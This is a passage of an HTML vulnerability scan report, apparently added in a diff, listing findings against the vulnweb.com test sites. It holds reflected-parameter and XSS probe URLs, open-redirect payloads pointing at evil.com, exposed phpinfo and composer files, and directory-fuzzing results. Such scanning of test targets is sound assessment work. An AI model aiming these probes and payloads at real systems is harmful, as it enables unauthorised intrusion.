+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2reewardius" target="_blank">http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2reewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-body</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testaspnet.vulnweb.com/Signup.aspx" target="_blank">http://testaspnet.vulnweb.com/Signup.aspx</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">body:__VIEWSTATE</span> <span class="extractor">POST</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-body</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testaspnet.vulnweb.com/about.aspx" target="_blank">http://testaspnet.vulnweb.com/about.aspx</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">body:__VIEWSTATE</span> <span class="extractor">POST</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-body</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testaspnet.vulnweb.com/Comments.aspx?id=3" target="_blank">http://testaspnet.vulnweb.com/Comments.aspx?id=3</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">body:__VIEWSTATE</span> <span class="extractor">POST</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-body</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testaspnet.vulnweb.com/Comments.aspx?id=2" target="_blank">http://testaspnet.vulnweb.com/Comments.aspx?id=2</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">body:__VIEWSTATE</span> <span class="extractor">POST</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3Freewardius" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3Freewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-body</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testaspnet.vulnweb.com/default.aspx" target="_blank">http://testaspnet.vulnweb.com/default.aspx</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">body:__VIEWSTATE</span> <span class="extractor">POST</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D3reewardius" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D3reewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D2reewardius" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D2reewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D1reewardius" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D1reewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2FSearch%2Easp%3Freewardius" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2FSearch%2Easp%3Freewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Register.asp?RetURL=%2FSearch%2Easp%3Freewardius" target="_blank">http://testasp.vulnweb.com/Register.asp?RetURL=%2FSearch%2Easp%3Freewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D1reewardius" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D1reewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Search.asp?tfSearch=katanareewardius" target="_blank">http://testasp.vulnweb.com/Search.asp?tfSearch=katanareewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:tfSearch</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0reewardius" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0reewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Register.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtmlreewardius" target="_blank">http://testasp.vulnweb.com/Register.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtmlreewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault%2Easp%3Freewardius" target="_blank">http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault%2Easp%3Freewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2reewardius" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2reewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2FSearch%2Easp%3FtfSearch%3Dkatanareewardius" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2FSearch%2Easp%3FtfSearch%3Dkatanareewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Search.asp?tfSearch=katanareewardius&amp;tfSearch=katana" target="_blank">http://testasp.vulnweb.com/Search.asp?tfSearch=katanareewardius&amp;tfSearch=katana</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:tfSearch_1</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtmlreewardius" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtmlreewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D3reewardius" target="_blank">http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D3reewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0reewardius" target="_blank">http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0reewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=/Default.asp?reewardius" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=/Default.asp?reewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-body</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testaspnet.vulnweb.com/Comments.aspx?id=0" target="_blank">http://testaspnet.vulnweb.com/Comments.aspx?id=0</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">body:__VIEWSTATE</span> <span class="extractor">POST</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0reewardius" target="_blank">http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0reewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-body</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">body:tfUPass</span> <span class="extractor">POST</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-body</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D1" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D1</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">body:tfUPass</span> <span class="extractor">POST</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-body</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">body:tfUPass</span> <span class="extractor">POST</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-body</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2FSearch%2Easp%3F" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2FSearch%2Easp%3F</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">body:tfUPass</span> <span class="extractor">POST</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Register.asp?RetURL=%2FSearch%2Easp%3FtfSearch%3Dkatanareewardius" target="_blank">http://testasp.vulnweb.com/Register.asp?RetURL=%2FSearch%2Easp%3FtfSearch%3Dkatanareewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D2reewardius" target="_blank">http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D2reewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-body</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtml" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtml</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">body:tfUPass</span> <span class="extractor">POST</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0reewardius" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0reewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testaspnet.vulnweb.com/ReadNews.aspx?id=0&amp;NewsAd=ads/def.htmlreewardius" target="_blank">http://testaspnet.vulnweb.com/ReadNews.aspx?id=0&amp;NewsAd=ads/def.htmlreewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:NewsAd</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testaspnet.vulnweb.com/ReadNews.aspx?id=3&amp;NewsAd=ads/def.htmlreewardius" target="_blank">http://testaspnet.vulnweb.com/ReadNews.aspx?id=3&amp;NewsAd=ads/def.htmlreewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:NewsAd</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testaspnet.vulnweb.com/ReadNews.aspx?id=2&amp;NewsAd=ads/def.htmlreewardius" target="_blank">http://testaspnet.vulnweb.com/ReadNews.aspx?id=2&amp;NewsAd=ads/def.htmlreewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:NewsAd</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-body</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">body:tfUPass</span> <span class="extractor">POST</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-xss-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Search.asp?tfSearch=katana&quot;&gt;&lt;94251&gt;" target="_blank">http://testasp.vulnweb.com/Search.asp?tfSearch=katana&quot;&gt;&lt;94251&gt;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:tfSearch</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-xss-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Search.asp?tfSearch=katana&quot;&gt;&lt;94251&gt;&amp;tfSearch=katana" target="_blank">http://testasp.vulnweb.com/Search.asp?tfSearch=katana&quot;&gt;&lt;94251&gt;&amp;tfSearch=katana</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:tfSearch_1</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="low">
+                    <h2>LOW (8)</h2>
+                    <table class="vuln-table">
+                        <thead>
+                            <tr>
+                                <th>CVE/Тип</th>
+                                <th>Протокол</th>
+                                <th>URL</th>
+                                <th>Дополнительная информация</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+
+                            <tr>
+                                <td>phpinfo-files</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://rest.vulnweb.com/info.php" target="_blank">http://rest.vulnweb.com/info.php</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">&quot;7.1.26&quot;</span> <span class="extractor">paths=&quot;/info.php&quot;</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>open-redirect-with-hash</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/redir.php?r=https://oast.me&amp;hash=9c4438eb62929d9b535fb6fe98223c5e" target="_blank">http://testphp.vulnweb.com/redir.php?r=https://oast.me&amp;hash=9c4438eb62929d9b535fb6fe98223c5e</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>open-redirect-pj</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/redir.php?r=https://evil.com" target="_blank">http://testphp.vulnweb.com/redir.php?r=https://evil.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>open-redirect-param-fuzzing</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/redir.php?r=//evil.com" target="_blank">http://testphp.vulnweb.com/redir.php?r=//evil.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>open-redirect-pj</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/redir.php?r=https://evil.com" target="_blank">http://testphp.vulnweb.com/redir.php?r=https://evil.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>phpinfo-files</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://rest.vulnweb.com/info.php" target="_blank">http://rest.vulnweb.com/info.php</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">&quot;7.1.26&quot;</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>iis-shortname</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/*~1*/a.aspx&#x27;" target="_blank">http://testasp.vulnweb.com/*~1*/a.aspx&#x27;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>iis-shortname</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testaspnet.vulnweb.com/*~1*/a.aspx&#x27;" target="_blank">http://testaspnet.vulnweb.com/*~1*/a.aspx&#x27;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="info">
+                    <h2>INFO (16)</h2>
+                    <table class="vuln-table">
+                        <thead>
+                            <tr>
+                                <th>CVE/Тип</th>
+                                <th>Протокол</th>
+                                <th>URL</th>
+                                <th>Дополнительная информация</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+
+                            <tr>
+                                <td>apache-detect</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://rest.vulnweb.com" target="_blank">http://rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">&quot;Apache/2.4.25 (Debian)&quot;</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>php-detect</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://rest.vulnweb.com" target="_blank">http://rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">&quot;7.1.26&quot;</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>apache-detect</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://rest.vulnweb.com:8081" target="_blank">http://rest.vulnweb.com:8081</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">&quot;Apache/2.4.25 (Debian)&quot;</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>php-detect</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://rest.vulnweb.com:8081" target="_blank">http://rest.vulnweb.com:8081</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">&quot;7.1.26&quot;</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>composer-config:composer.json</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://rest.vulnweb.com:8081/composer.json" target="_blank">http://rest.vulnweb.com:8081/composer.json</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>composer-config:composer.json</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://rest.vulnweb.com:8081/vendor/composer/installed.json" target="_blank">http://rest.vulnweb.com:8081/vendor/composer/installed.json</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>missing-sri</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testhtml5.vulnweb.com" target="_blank">http://testhtml5.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">&quot;http://code.jquery.com/jquery-1.9.1.min.js&quot;,&quot;http://netdna.bootstrapcdn.com/twitter-bootstrap/2.3.1/js/bootstrap.min.js&quot;,&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.0.6/angular.min.js&quot;,&quot;http://bxss.s3.amazonaws.com/ad.js&quot;,&quot;http://netdna.bootstrapcdn.com/twitter-bootstrap/2.3.1/css/bootstrap-combined.min.css&quot;,&quot;http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic&quot;</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>cookies-without-httponly</td>
+                                <td>javascript</td>
+                                <td class="vuln-url"><a href="testasp.vulnweb.com" target="_blank">testasp.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">&quot;ASPSESSIONIDACDQAABD&quot;</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>cookies-without-secure</td>
+                                <td>javascript</td>
+                                <td class="vuln-url"><a href="testasp.vulnweb.com" target="_blank">testasp.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">&quot;ASPSESSIONIDACDQAABD&quot;</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>nginx-version</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testhtml5.vulnweb.com" target="_blank">http://testhtml5.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">&quot;nginx/1.19.0&quot;</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>robots-txt-endpoint</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/robots.txt" target="_blank">http://testasp.vulnweb.com/robots.txt</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>old-copyright</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com" target="_blank">http://testasp.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">&quot;Copyright 2019&quot;</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>aspx-debug-mode</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testaspnet.vulnweb.com/Foobar-debug.aspx" target="_blank">http://testaspnet.vulnweb.com/Foobar-debug.aspx</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>cookies-without-secure</td>
+                                <td>javascript</td>
+                                <td class="vuln-url"><a href="testaspnet.vulnweb.com" target="_blank">testaspnet.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">&quot;ASP&quot;,&quot;NET_SessionId&quot;</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>cloud-storage-urls</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testhtml5.vulnweb.com" target="_blank">http://testhtml5.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">&quot;bxss.s3.amazonaws.com/ad.js&quot;</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>bucket-detect</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testhtml5.vulnweb.com" target="_blank">http://testhtml5.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">&quot;s3.amazonaws.com&quot;</span> </div></div></td>
+                            </tr>
+
+                        </tbody>
+                    </table>
+                </div>
+
+        </div>
+
+        <div id="FfufTab" class="tabcontent">
+            <div class="ffuf">
+                <h2>FFUF РЕЗУЛЬТАТЫ</h2>
+                <table class="vuln-table two-col-table">
+                    <thead>
+                        <tr>
+                            <th>№</th>
+                            <th>URL</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+
+                        <tr>
+                            <td>1</td>
+                            <td class="vuln-url"><a href="http://rest.vulnweb.com:8081/composer" target="_blank">http://rest.vulnweb.com:8081/composer</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>2</td>
+                            <td class="vuln-url"><a href="http://rest.vulnweb.com:8081/composer.json" target="_blank">http://rest.vulnweb.com:8081/composer.json</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>3</td>
+                            <td class="vuln-url"><a href="http://rest.vulnweb.com:8081/composer.lock" target="_blank">http://rest.vulnweb.com:8081/composer.lock</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>4</td>
+                            <td class="vuln-url"><a href="http://testhtml5.vulnweb.com/examples" target="_blank">http://testhtml5.vulnweb.com/examples</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>5</td>
+                            <td class="vuln-url"><a href="http://rest.vulnweb.com:8081/vendor/composer/installed.json" target="_blank">http://rest.vulnweb.com:8081/vendor/composer/installed.json</a></td>
+                        </tr>
+
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <div id="SensitiveTab" class="tabcontent">
+            <div class="sensitive">
+                <h2>SENSITIVE РЕЗУЛЬТАТЫ</h2>
+                <table class="vuln-table two-col-table">
+                    <thead>
+                        <tr>
+                            <th>№</th>
+                            <th>URL</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+
+                        <tr>
+                            <td>1</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/t/fit.txt?%00.jpg&amp;type=reform" target="_blank">http://testasp.vulnweb.com/t/fit.txt?%00.jpg&amp;type=reform</a></td>
